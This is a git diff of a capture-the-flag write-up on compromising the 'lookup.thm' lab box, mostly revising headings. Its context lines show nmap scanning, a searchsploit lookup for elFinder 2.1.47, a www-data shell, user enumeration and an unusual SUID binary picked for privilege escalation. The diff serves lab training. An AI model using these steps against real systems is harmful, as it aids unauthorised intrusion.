@@ -37,7 +37,7 @@ Server: Apache/2.4.41 (Ubuntu)
 Location: http://lookup.thm
 Content-Type: text/html; charset=UTF-8
 ```
-## Adding new host 
+## Adding to a new host 
 ```bash
 $ echo "10.10.69.10 lookup.thm" | sudo tee -e /etc/hosts
 ```
@@ -94,8 +94,8 @@ $ curl http://lookup.thm -v
 
 ![burp](burp.png)
 
-## Nmap 
-> TCP scanning 
+## Service detection 
+> Nmap TCP scanning 
 ```bash
 # gather detailed information about the target
 $ nmap -sC -sV -Pn -p$(nmap -p- --min-rate=1000 -T4 lookup.thm | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') lookup.thm 
@@ -253,8 +253,10 @@ user	10.43s
 sys	1.53s
 cpu	65%
 ```
+
 ![elfinder](elFinder.png)
-## vulnerability Identification
+
+## Vulnerability Identification
 ```bash
 $ searchsploit -w elFinder 2.1.47  
 -------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
@@ -375,7 +377,6 @@ www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$
 # Post Enumeration
 > Useful informations
 ```bash
-╔══════════╣ Searching root files in home dirs (limit 30)
 /home/
 /home/think/.bash_history
 /home/think/.viminfo
@@ -456,10 +457,6 @@ cat: .passwords: Permission denied
 ```
 ## Users
 ```bash
-╔══════════╣ Superusers
-root:x:0:0:root:/root:/usr/bin/bash
-
-╔══════════╣ Users with console
 root:x:0:0:root:/root:/usr/bin/bash
 think:x:1000:1000:,,,:/home/think:/bin/bash
 ```
@@ -479,11 +476,11 @@ think:x:1000:1000:,,,:/home/think:/bin/bash
 ```
 
 # Initial access
-## Linpeas (SUID) 
+## SUID bit set 
 ```bash
 -rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
 ```
-> My simple methodology for looking SUID files is to first check the last modified date.
+> My simple methodology for looking SUID set files is to first check the last modified date.
 ```bash
 www-data@lookup:~$ ls -al $(which pwm)
 ls -al $(which pwm)
